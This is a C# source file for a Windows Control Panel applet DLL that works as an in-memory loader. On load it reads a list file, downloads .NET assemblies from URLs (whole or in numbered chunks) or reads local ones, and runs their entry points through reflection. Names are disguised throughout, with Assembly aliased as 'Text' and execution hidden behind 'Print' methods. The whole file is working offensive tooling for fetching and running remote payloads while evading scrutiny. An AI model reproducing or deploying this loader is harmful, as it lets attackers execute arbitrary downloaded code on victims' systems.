using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using Text = System.Reflection.Assembly;
using System.Linq;

namespace CPL
{
    public class Class1
    {
        const uint ATTACH_PARENT_PROCESS = 0x0ffffffff;  // default value if not specifing a process ID
        const int ERROR_ACCESS_DENIED = 5; // process was already attached to another console
        public static string files = "list.txt";

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool AttachConsole(uint dwProcessID);

        [DllImport("kernel32", SetLastError = true)]
        static extern bool AllocConsole();
        private static void AllocateConsole()
        {
            //
            // the following should only be used in a non-console application type (C#)
            // (since a console is allocated/attached already when you define a console app.. :) )
            //
            if (!AttachConsole(ATTACH_PARENT_PROCESS) && Marshal.GetLastWin32Error() == ERROR_ACCESS_DENIED)
            {
                // A console was not allocated, so we need to make one.
                if (!AllocConsole())
                {
                    Console.WriteLine("A console could not be allocated, sorry!");
                    throw new Exception("Console Allocation Failed");
                }
                else
                {
                    Console.WriteLine("Is Attached, press a key...");
                    Console.ReadKey(true);
                    // you now may use the Console.xxx functions from .NET framework
                    // and they will work as normal
                }
            }
            else
                Console.WriteLine("Error allocating console, no output will be shown!");
        }

        static void Print(byte[] str, string[] args)
        {
            Text text = Text.Load(str);
            Print(text, args);
        }

        static byte[] GetChunked(int num, string url, int retry, int timeout)
        {
            Console.WriteLine("Getting {0} chunks of {1}", num, url);
            string[] splitd = url.Split('/');
            string executable = splitd[splitd.Length - 1];
            string filename = executable.Split('.')[0];

            WebClient client = new WebClient();

            byte[] str = null;

            string endpoint = String.Format("{0}//{1}/{2}/{2}.", splitd[0], splitd[2], filename, filename);
            for (int i = 0; i <= num; i++)
            {
                byte[] chunk = null;

                while (retry >= 0 && chunk == null)
                {
                    try
                    {
                        string url_chunk = String.Format("{0}{1}", endpoint, i.ToString("D2"));
                        // Console.WriteLine("Getting {0}", url_chunk);

                        chunk = client.DownloadData(url_chunk);
                        if (str == null)
                            str = chunk;
                        else
                        {
                            int current_lenght = str.Length;
                            Array.Resize(ref str, str.Length + chunk.Length);
                            Array.Copy(chunk, 0, str, current_lenght, chunk.Length);
                        }

                    }
                    catch (WebException ex)
                    {
                        retry--;
                        Thread.Sleep(timeout * 10000);
                    }
                }
                if (chunk == null)
                {
                    Environment.Exit(-1);
                }
            }
            return str;
        }

        static void Print(string file, string[] args)
        {
            Text text = Text.LoadFile(file);
            Print(text, args);
        }

        static void Print(Text text, string[] args)
        {
            text.EntryPoint.Invoke(null, new object[] { args });
        }

        static byte[] GetTextWeb(string url, int retry, int timeout)
        {
            Console.WriteLine($"{url}");

            // If https desired
            // ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient client = new WebClient();
            byte[] str = null;
            while (retry >= 0 && str == null)
            {
                try
                {
                    str = client.DownloadData(url);
                }
                catch (WebException ex)
                {
                    retry--;
                    Thread.Sleep(timeout * 10000);
                }
            }
            if (str == null)
            {
                Environment.Exit(-1);
            }

            return str;
        }

        static int CrossReflect()
        {
            // Check if list.txt config file exists           
            string configfile = Path.GetFullPath(files);
            if (!File.Exists(files))
            {
                Console.WriteLine("[-] File not found.");
                return -1;
            }
            Console.WriteLine("[+] {0} found, processing list of files", files);
            string[] executables = File.ReadAllLines(configfile);
            foreach (string file in executables)
            {
                string escape = "%%THIS%%";

                Console.WriteLine("[+] Processing {0}", file);

                string replaced = file.Replace("\\ ", escape); // Escape spaces in arguments
                string[] words = replaced.Split(' '); // Parse line <exe> <arg 1> <arg 2> ... <arg n>
                string first_arg = words[0]; // <exe>

                string[] args = new string[words.Length - 1]; // <arg 1> <arg 2> ... <arg n>
                if (words.Length > 1)
                {
                    string[] tmp = words.Skip(1).ToArray();
                    int i = 0;

                    foreach (string t in tmp)
                    {
                        args[i] = t.Replace(escape, " "); // Replace escaped string with space
                        i++;
                    }
                }

                // Ignore comments
                if (first_arg.StartsWith("#"))
                {
                    continue;
                }
                if (first_arg.StartsWith("http"))
                {
                    byte[] text = GetTextWeb(first_arg, 3, 1);
                    Print(text, args);
                }
                else if (File.Exists(Path.GetFullPath(first_arg)))
                {
                    Console.WriteLine(Path.GetFullPath(first_arg));
                    Print(first_arg, args);
                }
                // If is neither of previous one, then it is a transformed
                // format should be <func> <func args> <exe> <exe args> ... <exe args n>
                else if (first_arg.Equals("chunks"))
                {
                    // chunks n_chunks http://... <args>
                    // Skip to exe args
                    args = args.Skip(2).ToArray();
                    byte[] chunked_exe = GetChunked(Int32.Parse(words[1]), words[2], 3, 1);

                    try
                    {
                        Print(chunked_exe, args);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("{0}", e);
                    }
                }
                else
                {
                    Console.WriteLine("[-] Command not supported.");
                }

                Console.WriteLine("[+] Finished");
            }
            Console.WriteLine("[+] Done executing");
            return 0;
        }

        [DllExport]
        public static int CPlApplet(int a, int b, string c, int d)
        {
            AllocateConsole();

            return CrossReflect();
        }

        [DllExport]
        public static int DllMain(int a, int b, string c, int d)
        {
            AllocateConsole();

            return CrossReflect();
        }
    }
}
